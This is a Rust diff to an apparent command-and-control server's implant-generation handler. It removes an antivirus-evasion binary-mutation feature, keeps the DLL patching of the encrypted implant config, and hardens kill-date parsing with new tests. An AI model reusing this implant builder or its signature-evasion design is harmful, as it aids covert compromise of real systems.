@@ -23,9 +23,8 @@
 //!
 //! The implant's X25519 private key and the server's public key are stored
 //! directly in the `.nyx_cfg` section. The DLL binary itself is the protection
-//! layer — stripped symbols, encrypted section, and binary mutation
-//! (`FEATURE_MUTATE`) produce per-implant unique fingerprints that resist
-//! static signature matching.
+//! layer — stripped symbols and the encrypted section produce per-implant
+//! fingerprints that resist casual static signature matching.
 
 use std::sync::Arc;
 
@@ -34,18 +33,12 @@ use axum::{
     http::{HeaderMap, StatusCode},
     Json,
 };
-use nyx_mutate::{MutationPasses, MutationReport, Mutator};
 use nyx_protocol::wire::Writer;
 use rand::RngCore;
 use serde::{Deserialize, Serialize};
 use sha2::{Digest, Sha256};
 
 use crate::{operators::OperatorIdentity, operators::Role, AppState, AuthOutcome};
-
-/// Feature bit (bit 30 in the `features` u32) that enables binary mutation
-/// (NOP insertion, register rotation, key randomization) during implant
-/// generation. Set this flag to produce per-implant unique binary fingerprints.
-pub const FEATURE_MUTATE: u32 = 0x4000_0000;
 
 /// Return type of [`generate_implant_keys`]: (implant_priv, implant_pub,
 /// config_key, key_seed, auth_token, config_nonce) — all fixed-size arrays.
@@ -262,6 +255,14 @@ fn default_tls() -> bool {
 /// Returns `None` on any parse failure — the caller must surface this as a
 /// 400 rather than silently defaulting to "never expire" (the v0.3.0 bug).
 ///
+/// Validation is fail-closed:
+///   - Years before 1970 are rejected: a kill date before the Unix epoch is
+///     meaningless, and the civil-to-days conversion would go negative.
+///   - The calendar check is exact: `civil_to_days` validates days-in-month
+///     with leap-year logic (`2023-02-29` and `2025-04-31` are rejected).
+///   - All arithmetic is checked: the conversions use `checked_mul`/
+///     `checked_add`, so a value can never silently wrap a `u64`.
+///
 /// No `time`/`chrono` dependency — the parser is a hand-rolled ~40-line scan.
 /// Civil-to-days-since-epoch uses the well-known Howard Hinnant algorithm
 /// (valid for any year in [1970, 9999]).
@@ -281,6 +282,11 @@ fn parse_iso8601_to_unix(s: &str) -> Option<u64> {
         return None;
     }
     let year: u32 = s[..4].parse().ok()?;
+    // Reject pre-epoch years: the Hinnant conversion yields negative day
+    // counts for them, and a pre-1970 kill date is meaningless anyway.
+    if year < 1970 {
+        return None;
+    }
     if bytes[4] != b'-' || bytes[7] != b'-' {
         return None;
     }
@@ -289,10 +295,11 @@ fn parse_iso8601_to_unix(s: &str) -> Option<u64> {
     }
     let month: u32 = s[5..7].parse().ok()?;
     let day: u32 = s[8..10].parse().ok()?;
-    let days = civil_to_days(year, month, day)?;
+    // year >= 1970 ⇒ days >= 0; try_from is the checked conversion.
+    let days = u64::try_from(civil_to_days(year, month, day)?).ok()?;
     // Default to midnight UTC if no time component.
     if bytes.len() == 10 {
-        return Some(days as u64 * 86_400);
+        return days.checked_mul(86_400);
     }
     // Expect 'T' or ' ' separator then HH:MM:SS.
     if bytes[10] != b'T' && bytes[10] != b't' && bytes[10] != b' ' {
@@ -322,21 +329,56 @@ fn parse_iso8601_to_unix(s: &str) -> Option<u64> {
             return None; // non-UTC offset — reject
         }
     }
-    let secs = days as u64 * 86_400 + hour as u64 * 3600 + minute as u64 * 60 + second as u64;
+    let secs = days
+        .checked_mul(86_400)?
+        .checked_add(u64::from(hour).checked_mul(3_600)?)?
+        .checked_add(u64::from(minute).checked_mul(60)?)?
+        .checked_add(u64::from(second))?;
     Some(secs)
 }
 
+/// True iff `y` is a Gregorian leap year (divisible by 4, except centuries
+/// not divisible by 400).
+fn is_leap_year(y: u32) -> bool {
+    (y % 4 == 0 && y % 100 != 0) || y % 400 == 0
+}
+
+/// Days in Gregorian month `m` of year `y`, with February leap-day handling.
+/// Returns 0 for an out-of-range month so the days-in-month check in
+/// [`civil_to_days`] fails closed (callers reject `m` outside 1-12 anyway).
+fn days_in_month(y: u32, m: u32) -> u32 {
+    match m {
+        1 | 3 | 5 | 7 | 8 | 10 | 12 => 31,
+        4 | 6 | 9 | 11 => 30,
+        2 if is_leap_year(y) => 29,
+        2 => 28,
+        _ => 0,
+    }
+}
+
 /// Civil (gregorian) date → days since 1970-01-01. Howard Hinnant's algorithm.
-/// Returns None for out-of-range month/day (caller surfaces as 400).
+/// Returns None for out-of-range month/day (caller surfaces as 400). The day
+/// check is exact per month — including leap-year February — via
+/// [`days_in_month`].
 fn civil_to_days(y: u32, m: u32, d: u32) -> Option<i64> {
-    if !(1..=12).contains(&m) || !(1..=31).contains(&d) {
+    // Domain guard: the epoch-relative arithmetic is only used for years in
+    // [1970, 9999] (the caller rejects earlier years; the 4-digit year parse
+    // caps at 9999). Keeping the check here too makes the function
+    // self-contained: years before 1970 would produce negative day counts
+    // that must never reach the caller's `u64` conversion.
+    if y < 1970 || y > 9999 {
+        return None;
+    }
+    if !(1..=12).contains(&m) || d < 1 || d > days_in_month(y, m) {
         return None;
     }
     let y = y as i64;
     let m = m as i64;
     let d = d as i64;
     let y0 = y - if m <= 2 { 1 } else { 0 };
-    let era = if y0 >= 0 { y0 } else { y0 - 399 } / 400;
+    // y >= 1970 ⇒ y0 >= 1969 >= 0, so the classic algorithm's negative-era
+    // branch (y0 < 0) is unreachable here; era is a plain floor division.
+    let era = y0 / 400;
     let yoe = (y0 - era * 400) as u64; // [0, 399]
     let doy = (153 * (if m > 2 { m - 3 } else { m + 9 }) + 2) / 5 + d - 1; // [0, 365]
     let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy as u64; // [0, 146096]
@@ -400,6 +442,33 @@ mod tests {
         // Bad time.
         assert_eq!(parse_iso8601_to_unix("2025-01-01T25:00:00Z"), None);
         assert_eq!(parse_iso8601_to_unix("2025-01-01T00:60:00Z"), None);
+    }
+
+    #[test]
+    fn validates_days_in_month_with_leap_year_logic() {
+        // February: 2024 is a leap year → 29 valid; 2023 is not → 29 invalid.
+        assert_eq!(parse_iso8601_to_unix("2024-02-29"), Some(1_709_164_800));
+        assert_eq!(parse_iso8601_to_unix("2023-02-29"), None);
+        // 30-day months reject day 31; 31-day months accept it.
+        assert_eq!(parse_iso8601_to_unix("2025-04-30"), Some(1_745_971_200));
+        assert_eq!(parse_iso8601_to_unix("2025-04-31"), None);
+        assert_eq!(parse_iso8601_to_unix("2025-01-31"), Some(1_738_281_600));
+        // Century rule: 2000 is a leap year, 2100 is not.
+        assert_eq!(parse_iso8601_to_unix("2000-02-29"), Some(951_782_400));
+        assert_eq!(parse_iso8601_to_unix("2100-02-29"), None);
+        assert_eq!(parse_iso8601_to_unix("2400-02-29"), Some(13_574_563_200));
+        // Day 0 is invalid.
+        assert_eq!(parse_iso8601_to_unix("2025-01-00"), None);
+    }
+
+    #[test]
+    fn rejects_pre_epoch_years() {
+        assert_eq!(parse_iso8601_to_unix("1969-12-31"), None);
+        assert_eq!(parse_iso8601_to_unix("1970-01-01"), Some(0));
+        assert_eq!(parse_iso8601_to_unix("1970-01-01T00:00:00Z"), Some(0));
+        // Bare unix seconds are epoch-relative and remain valid for values
+        // below the epoch — they are seconds, not civil dates.
+        assert_eq!(parse_iso8601_to_unix("0"), Some(0));
     }
 }
 
@@ -696,21 +765,17 @@ fn encrypt_implant_config(
     Ok(ct_with_tag)
 }
 
-/// Patch the DLL template: apply binary mutation (if FEATURE_MUTATE is set),
-/// locate and patch the .nyx_cfg section, and validate the PE.
-/// Returns the mutation report (None if mutation is disabled).
+/// Patch the DLL template, locate and patch the .nyx_cfg section, and validate
+/// the PE.
 fn patch_implant_template(
     binary: &mut Vec<u8>,
     req: &GenerateRequest,
     implant_priv: [u8; 32],
-    implant_pub: [u8; 32],
     server_pub: [u8; 32],
     config_nonce: [u8; 12],
     ct_with_tag: &[u8],
-) -> Result<Option<MutationReport>, (StatusCode, String)> {
+) -> Result<(), (StatusCode, String)> {
     // Sanity-check the config ciphertext size before we touch the binary.
-    // (The .nyx_cfg placeholder is located *after* mutation, since mutation
-    // can shift its offset.)
     let data_len = ct_with_tag.len();
     if data_len > 900 {
         return Err((
@@ -719,53 +784,7 @@ fn patch_implant_template(
         ));
     }
 
-    // 4a. Apply binary mutation FIRST (before patching the .nyx_cfg section).
-    //
-    // The mask/fragment-permutation derivation MUST run against the *final*
-    // bytes the implant sees at runtime. If we mutated after patching, the
-    // masks (derived from the pre-mutation header) would not match the
-    // post-mutation header the implant reads — key recovery would silently
-    // fail. Mutating the unpatched template first means the mutator's
-    // `randomize_keys` pass sees the placeholder (`0x41414141`, not the
-    // `0xDEADBEEF` it looks for) and leaves that region untouched, so the
-    // placeholder survives to be re-located and patched below.
-    let mutation_report = if req.features & FEATURE_MUTATE != 0 {
-        // Use the implant's private key bytes as the mutation seed for
-        // deterministic, per-implant-unique mutation that is reproducible
-        // from the audit log.
-        let seed = u64::from_le_bytes([
-            implant_priv[0],
-            implant_priv[1],
-            implant_priv[2],
-            implant_priv[3],
-            implant_priv[4],
-            implant_priv[5],
-            implant_priv[6],
-            implant_priv[7],
-        ]);
-        let mutator = Mutator::new(seed);
-        let passes = MutationPasses {
-            nops: true,
-            registers: true,
-            keys: true,
-            substitute: true,
-        };
-        let report = mutator.mutate(binary, passes);
-        tracing::info!(
-            implant_pub = %hex::encode(implant_pub),
-            nops = report.nops_inserted,
-            regs = report.registers_swapped,
-            keys = report.keys_randomized,
-            subst = report.instructions_substituted,
-            "binary mutation applied"
-        );
-        Some(report)
-    } else {
-        None
-    };
-
-    // 4b. Re-locate the .nyx_cfg placeholder. Mutation (NOP insertion) may
-    // have shifted its offset, so we cannot reuse the pre-mutation value.
+    // Re-locate the .nyx_cfg placeholder in the pristine template.
     let placeholder_offset = binary
         .windows(8)
         .position(|w| {
@@ -779,8 +798,7 @@ fn patch_implant_template(
         .ok_or_else(|| {
             (
                 StatusCode::INTERNAL_SERVER_ERROR,
-                "mutated DLL has no .nyx_cfg placeholder (0x41414141 + 0xAA) \
-                 — mutation likely corrupted it"
+                "DLL template has no .nyx_cfg placeholder (0x41414141 + 0xAA)"
                     .into(),
             )
         })?;
@@ -844,7 +862,7 @@ fn patch_implant_template(
         )
     })?;
 
-    Ok(mutation_report)
+    Ok(())
 }
 
 /// Compute SHA-256, store implant metadata, audit the generation event, and
@@ -858,7 +876,6 @@ fn store_and_audit_implant(
     binary: &[u8],
     implant_pub: [u8; 32],
     auth_token: [u8; 32],
-    mutation_report: &Option<MutationReport>,
 ) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
     // 5. Compute SHA-256 of the output.
     let mut hasher = Sha256::new();
@@ -919,7 +936,7 @@ fn store_and_audit_implant(
 
     // 7. Audit the generation event.
     if let Some(audit) = &st.audit {
-        let mut detail = serde_json::json!({
+        let detail = serde_json::json!({
             "implant_id": id,
             "implant_pub": hex::encode(implant_pub),
             "callback": req.callback,
@@ -927,15 +944,6 @@ fn store_and_audit_implant(
             "format": req.format,
             "sha256": sha256,
         });
-        if let Some(report) = mutation_report {
-            detail["mutation"] = serde_json::json!({
-                "enabled": true,
-                "nops_inserted": report.nops_inserted,
-                "registers_swapped": report.registers_swapped,
-                "keys_randomized": report.keys_randomized,
-                "instructions_substituted": report.instructions_substituted,
-            });
-        }
         audit.append("implant_generated", &op.name, "", detail);
     }
 
@@ -1011,11 +1019,10 @@ pub async fn generate_implant(
 
     // 6. Patch the DLL template.
     let mut binary = (**template).clone();
-    let mutation_report = patch_implant_template(
+    patch_implant_template(
         &mut binary,
         &req,
         implant_priv,
-        implant_pub,
         server_pub,
         config_nonce,
         &ct_with_tag,
@@ -1030,7 +1037,6 @@ pub async fn generate_implant(
         &binary,
         implant_pub,
         auth_token,
-        &mutation_report,
     )?;
 
     Ok(response)
